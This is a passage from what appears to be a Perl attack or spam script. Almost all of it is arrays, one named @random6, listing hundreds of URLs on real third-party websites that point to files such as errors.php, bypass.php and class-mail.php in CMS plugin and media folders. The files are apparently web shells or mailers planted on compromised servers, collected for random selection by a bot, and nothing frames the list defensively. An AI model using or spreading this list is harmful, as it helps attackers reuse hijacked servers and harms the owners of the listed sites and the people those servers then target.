"http://www.sapphireengagement.co.uk/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb/error.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://www.studiofifteen.in/errors.php",
"http://daddivamoda.com.br/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php"
);

my @random6  = ("www.beslistfietsen.nl/errors.php",
"citizenofburma.org//plugins/content/errors.php",
"http://choir.louwanjpoujezi.org//plugins/content/errors.php",
"http://gdthuyphuong.free.fr//includes/errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://zamzamsweets.in/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://www.dvdmall.us/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://www.rotarymowers.com.au/errors.php",
"http://printi.be/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://orcastudio.co/blog/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb///error.php",
"http://www.decorvega.es/bypass.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://re-bel.org//bypass.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://friendsofradstockrailwayland.org/upload/bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://techno.pk/skin/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://kenthecomicman.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"http://sumaho-print.net//bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://laptopcity.co.nz/bypass.php",
"http://www.studiofifteen.in/errors.php",
"http://daddivamoda.com.br/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://www.kittfoundation.org//wp-includes/js/plupload/index.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.travelpointer.ro//wp-includes/js/plupload/index.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.orfej.si/components/com_mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.dileeponline.com/errors.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://vdfs.ru//plugins/editors/error.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.ele-eme.com.mx/error.php",
"http://virtualmacompetition.com//error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://deangelisviaggi.it//wp-admin/network/error.php",
"http://www.elado.ro//xmlrpc/error.php",
"http://www.oem-dealer-parts.ca//components/com_media/error.php",
"http://blog.eurostargym.com/wp-includes/js/thickbox/class-mail.php",
"http://shop.stroiportal.kz/cgi-bin/error.php",
"http://www.mecanica.ufrj.br/ufrj-em//components/error.php",
"http://www.t1site.com.br/wp-admin/error.php",
"http://quadrabrain.com//wp-admin/error.php",
"http://milesnation.com/whitney/css/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.ehbo-eelde.nl/media/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.alexgretter.com/google.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.thewigmall.com/errors.php",
"http://www.solucionesparati.net/CMS2008/images/error.php",
"http://www.allcam.org/errors.php",
"http://totalfish.hu/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.theatresprives.com/errors.php",
"http://wesotech.com/contact/google.php",
"http://moreketing.mx/errors.php",
"http://sufbellman.dk/media/error.php",
"http://www.mariobabiera.com/google.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://pastorbonus.sk/errors.php",
"http://test.stramed.com.tr/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.psdf.org.pk/errors.php",
"http://iheld.com/errors.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.musetti.eu/errors.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.lincos.si/components/com_banners/models/error.php",
"http://eventos.unisangil.edu.co/media/media/css/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://lisarkent.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://blizzsozz.com/errors.php",
"http://www.conradel.com/errors.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://kavkazinterpress.ru/plugins/content/config.inc.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://www.pkstorages.com//plugins/content/seka.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://themansphere.com/wp-includes/error.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://www.thermona-ekb.ru/errors.php", 
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://islamone.org/flash/errors.php",
"http://pnpdistribuidora.com.br//erros/errors.php",
"http://ancoimbra.net//media/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.thomastyreperu.com//plugins/errors.php",
"http://soosh-lb.com//errors.php",
"http://eshopbmw.com//skin/adminhtml/default/error.php",
"http://www.mecanica.coppe.ufrj.br/ufrj-em//components/com_media/error.php",
"http://www.iwhatswatch.com//skin/frontend/default/default/images/error.php",
"http://www.imc-egypt.org//cli/error.php",
"http://www.thermona-ekb.ru/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.angola-embassy.nl/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://arpwegenwaterbouw.nl/wp-content/themes/smartbox-theme/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://pnpdistribuidora.com.br//errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"http://www.starcom1.eu/skin/adminhtml/error.php",
"http://zlotohiszpanii.pl/skin/adminhtml/error.php",
"http://king-solarman.com/skin/adminhtml/base/error.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.karpet.cz/media/system/js/jquery.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://themansphere.com/wp-includes/error.php",
"http://www.cloudipalarm.nl/wp-content/plugins/revslider/temp/errors.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.thewigmall.com/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://www.addisyouth.org.et/components/com_mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://www.tcfa1.net/errors.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://www.deltadunariilive.ro/wp-content/errors.php",
"http://fisioleste.com.br/wp-admin/errors.php",
"http://resources.opth1jobs.com//modules/errors.php",
"http://www.propertydd4u.com//errors.php",
"http://www.skipperdean.com//media/errors.php",
"http://www.baskingshark.ie//media/errors.php",
"http://flirtbogota.co/web3//media/errors.php",
"http://gaysm.pl/media/errors.php",
"http://www.baliste-club.org//media/errors.php",
"http://tbilisi-portal.com//tmp/errors.php",
"http://store.setar.aw/errors.php",
"http://www.pokal-royal.de//js/errors.php",
"http://www.fiesta-del-sol.fr//errors.php",
"http://ethnikometopo.gr//tmp/errors.php",
"http://newlifebiblechurch.org//media/errors.php",
"http://www.cjbg.ma/errors.php",
"http://donghohanghieu.diemnhan.net//errors.php",
"http://inovatyonconsorcio.com.br/errors.php",
"http://www.toprace.co.uk/errors.php",
"http://pretty-talk.com//js/lib/errors.php",
"http://ifeed.co.kr//errors.php",
"http://abcofficemoveis.com.br/novo/media/errors.php",
"http://www.gramophoneshop.nl/webshop//skin/frontend/default/errors.php",
"http://prweb.com.sg/maimee/errors.php",
"http://bkd.bimakota.go.id//wp-admin/css/colors/blue/errors.php",
"http://www.siambeautyonline.com//errors.php",
"http://www.supon.tech//skin/adminhtml/default/default/images/moneybookers/errors.php",
"http://www.icomplementi.com/picture_library/errors.php",
"http://gaysm.pl/flash/modules/global/js/errors.php",
"http://www.chrontel.com/skin/adminhtml/default/default/lib/prototype/windows/themes/magento/.../errors.php",
"http://www.internetrights.in/wp-content/plugins/contact-form-7/images/service-icons/errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://mrsteamers.com//wp-content/plugins/errors.php",
"http://onlineordering.alumaxshowerdoor.com/skin/frontend/errors.php",
"http://www.chispazorumbas.com//plugins/errors.php",
"http://projects.kurinjiemedia.com/singlemovie//wp-content/plugins/errors.php",
"http://pasionporlajusticia.com/2015//wp-content/plugins/errors.php",
"http://www.younik.co/skin/frontend/errors.php",
"http://www.fedir.it//components/com_mailto/views/mailto/errors.php",
"http://www.copati.org.br//images/jdownloads/screenshots/thumbnails/errors.php",
"http://tuva-church.com/slovo//wp-content/plugins/dzs-videogallery/errors.php",
"http://morada.com.ve/newsite//wp-content/plugins/dzs-videogallery/errors.php",
"http://cmtactical.com//skin/install/default/default/errors.php",
"http://oldfashionedman.com//errors.php",
"http://ajansfestival.com/wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://tricotrico.com/wp-includes/error.php",
"http://www.shg-vaskulitis-eifel-mosel.de//forum/style/portal/error.php",
"http://nutritie-wellness.ro/var/package/tmp/error.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://themansphere.com/wp-includes/error.php",
"https://www.cloudipalarm.nl/wp-content/plugins/revslider/temp/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://www.lupetticonsultoria.com.br//kellylupetti/errors.php",
"http://redzee.com.au/friends/errors.php",
"http://watchmanreports.com/errors.php",
"http://www.chispazorumbas.com//hwdvideos/errors.php",
"http://islamone.org/errors.php",
"http://hoopsnhiphop.com/errors.php",
"http://www.brasilecon.net/skin/errors.php",
"http://redzee.com.au/friends/inc/classes/errors.php",
"http://shoppershopee.com/errors.php",
"http://xoxofimp.com//errors.php",
"http://islamone.org/flash/errors.php",
"http://www.lmcreativedesign.com.br/wp-content/plugins/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.thermona-ekb.ru/errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://www.jhanjhatfree.com//skin/frontend/base/errors.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://therfw.com/wp-includes/error.php",
"http://representacoesdasa.com.br/wp-admin/errors.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.telsonet.pl/errors.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://pastorbonus.sk/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://www.imakecollege.com:37001//plugins/editors/errors.php",
"http://imotionasia.com.vn/errors.php",
"http://www.theatresprives.com/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://moreketing.mx/errors.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.psdf.org.pk/errors.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://circuitec.com.br/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.musetti.eu/errors.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.thewigmall.com/errors.php",
"https://www.aavamobile.com/modules/mod_search/index.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.cannell-immobilier.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://sufbellman.dk//errors.php",
"http://printfastt.com.br/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://blizzsozz.com/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://www.mirabalcenter.org//errors.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://hoponhopoff.ge//errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://zamzamsweets.in/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://www.dvdmall.us/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://www.rotarymowers.com.au/errors.php",
"http://printi.be/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://orcastudio.co/blog/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb///error.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://re-bel.org//bypass.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://friendsofradstockrailwayland.org/upload/bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://techno.pk/skin/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://kenthecomicman.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"http://sumaho-print.net//bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://laptopcity.co.nz/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://www.kittfoundation.org//wp-includes/js/plupload/index.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.travelpointer.ro//wp-includes/js/plupload/index.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.orfej.si/components/com_mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.dileeponline.com/errors.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://vdfs.ru//plugins/editors/error.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.ele-eme.com.mx/error.php",
"http://virtualmacompetition.com//error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://deangelisviaggi.it//wp-admin/network/error.php",
"http://www.elado.ro//xmlrpc/error.php",
"http://www.oem-dealer-parts.ca//components/com_media/error.php",
"http://blog.eurostargym.com/wp-includes/js/thickbox/class-mail.php",
"http://shop.stroiportal.kz/cgi-bin/error.php",
"http://www.mecanica.ufrj.br/ufrj-em//components/error.php",
"http://www.t1site.com.br/wp-admin/error.php",
"http://quadrabrain.com//wp-admin/error.php",
"http://milesnation.com/whitney/css/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.ehbo-eelde.nl/media/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.alexgretter.com/google.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.thewigmall.com/errors.php",
"http://www.solucionesparati.net/CMS2008/images/error.php",
"http://www.allcam.org/errors.php",
"http://totalfish.hu/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.theatresprives.com/errors.php",
"http://wesotech.com/contact/google.php",
"http://moreketing.mx/errors.php",
"http://sufbellman.dk/media/error.php",
"http://www.mariobabiera.com/google.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://pastorbonus.sk/errors.php",
"http://test.stramed.com.tr/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.psdf.org.pk/errors.php",
"http://iheld.com/errors.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.musetti.eu/errors.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.lincos.si/components/com_banners/models/error.php",
"http://eventos.unisangil.edu.co/media/media/css/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://lisarkent.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://blizzsozz.com/errors.php",
"http://www.conradel.com/errors.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://kavkazinterpress.ru/plugins/content/config.inc.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://www.pkstorages.com//plugins/content/seka.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://themansphere.com/wp-includes/error.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://www.thermona-ekb.ru/errors.php", 
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
